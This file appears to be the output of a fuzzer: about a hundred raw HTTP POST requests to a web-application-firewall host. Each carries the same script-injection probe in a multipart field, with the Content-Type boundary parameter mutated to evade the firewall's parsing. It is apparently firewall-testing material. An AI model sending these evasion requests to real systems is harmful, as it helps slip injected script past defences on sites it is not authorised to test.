POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 44\r\nContent-Type: multipart/form-data; b\x16undkKry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 108\r\nContent-Type: multipart/form-data; bundary=bounda]ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 172\r\nContent-Type: multipart/form-data; bouIdarybouqnd\x00ay;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 236\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 300\r\nContent-Type: multipart/form-data; boundaryoundary]boundary\xc2\xbboPndaryboundaIry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 364\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 428\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 492\r\nContent-Type: multipart/form-data; =bnmdary=\x1fbounldary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 556\r\nContent-Type: multipart/form-data; b@ndary=bou@ndaZyounda\x0fry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 620\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 684\r\nContent-Type: multipart/form-data; boundarybound\x1ca\x18];\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 748\r\nContent-Type: multipart/form-data; boundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 812\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 876\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 940\r\nContent-Type: multipart/form-data; bou\x07darybounaryOoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 53\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 117\r\nContent-Type: multipart/form-data; boundryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 181\r\nContent-Type: multipart/form-data; :boundarybouPdal\x7fy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 245\r\nContent-Type: multipart/form-data; boundar*=boundar\x7fy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 309\r\nContent-Type: multipart/form-data; boudary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 373\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 437\r\nContent-Type: multipart/form-data; bundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 501\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 565\r\nContent-Type: multipart/form-data; boundarybo\'nd7;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 629\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 693\r\nContent-Type: multipart/form-data; b3u5a\x0by;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 757\r\nContent-Type: multipart/form-data; \x0fboudavr9==boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 821\r\nContent-Type: multipart/form-data; =bQundary=oun^\x18dar";\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 885\r\nContent-Type: multipart/form-data; =boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 949\r\nContent-Type: multipart/form-data; bund"ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 54\r\nContent-Type: multipart/form-data; boundar*=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 118\r\nContent-Type: multipart/form-data; Gbounaa\nynda\x18y=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 182\r\nContent-Type: multipart/form-data; ]dboundr=\x0bundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 246\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 310\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 374\r\nContent-Type: multipart/form-data; boun\x1ddhrybounqdary=bounDdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 438\r\nContent-Type: multipart/form-data; bounda\x06yb^undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 502\r\nContent-Type: multipart/form-data; mbondry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 566\r\nContent-Type: multipart/form-data; boundaryb.unt;ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 630\r\nContent-Type: multipart/form-data; boundaryboun\\ary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 694\r\nContent-Type: multipart/form-data; 9oundarboundaryboqnaryy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 758\r\nContent-Type: multipart/form-data; boundarybounda^ry=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 822\r\nContent-Type: multipart/form-data; boundar=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 886\r\nContent-Type: multipart/form-data; boundary=\x0fbundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 950\r\nContent-Type: multipart/form-data; boundaryboundary=bounda;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 48\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 112\r\nContent-Type: multipart/form-data; bo.undaryboun\x02ary===bounYaLy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 176\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 240\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 304\r\nContent-Type: multipart/form-data; boundaryboundaryboudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 368\r\nContent-Type: multipart/form-data; boundary====\x7foundar4y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 432\r\nContent-Type: multipart/form-data; bk\x1fqndar\x1dbbundar\x14A;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 496\r\nContent-Type: multipart/form-data; boundrkb\x12nar)y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 560\r\nContent-Type: multipart/form-data; boYndaybun&dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 624\r\nContent-Type: multipart/form-data; boundarypbound\'ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 688\r\nContent-Type: multipart/form-data; boundaryboundar_y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 752\r\nContent-Type: multipart/form-data; boundarPyboun{d\xc2\xaby;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 816\r\nContent-Type: multipart/form-data; bounary=bounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 880\r\nContent-Type: multipart/form-data; boundary=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 944\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 42\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 106\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 170\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 234\r\nContent-Type: multipart/form-data; bou{^nda@rW=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 298\r\nContent-Type: multipart/form-data; boundar;]=boOndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 362\r\nContent-Type: multipart/form-data; \x1dboFundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 426\r\nContent-Type: multipart/form-data; bound\tary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 490\r\nContent-Type: multipart/form-data; boundary=b^xudar\x140y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 554\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 618\r\nContent-Type: multipart/form-data; b@undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 682\r\nContent-Type: multipart/form-data; boundaryboundar)0;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 746\r\nContent-Type: multipart/form-data; boundarLy==\x11bouodar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 810\r\nContent-Type: multipart/form-data; bounda3y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 874\r\nContent-Type: multipart/form-data; b\x1aoundary=bo#uCary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 938\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 52\r\nContent-Type: multipart/form-data; bo\x14nd8ary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 116\r\nContent-Type: multipart/form-data; bund?an==`joHndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 180\r\nContent-Type: multipart/form-data; boundary==\x11oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 244\r\nContent-Type: multipart/form-data; o\x1bndT\x08=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 308\r\nContent-Type: multipart/form-data; bounary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 372\r\nContent-Type: multipart/form-data; boundary=bound\x1fary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 436\r\nContent-Type: multipart/form-data; bbu\x16ndary==\x06bou|dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 500\r\nContent-Type: multipart/form-data; ===b\x02+unQary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 564\r\nContent-Type: multipart/form-data; bondary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 628\r\nContent-Type: multipart/form-data; boundary==boC:dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 692\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 756\r\nContent-Type: multipart/form-data; bounYryboundar=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 820\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 884\r\nContent-Type: multipart/form-data; =====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 948\r\nContent-Type: multipart/form-data; =oundary\x0eoundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 55\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 119\r\nContent-Type: multipart/form-data; bounxdary=boundayoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 183\r\nContent-Type: multipart/form-data; =boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 247\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 311\r\nContent-Type: multipart/form-data; =bundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 375\r\nContent-Type: multipart/form-data; bou1dayboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
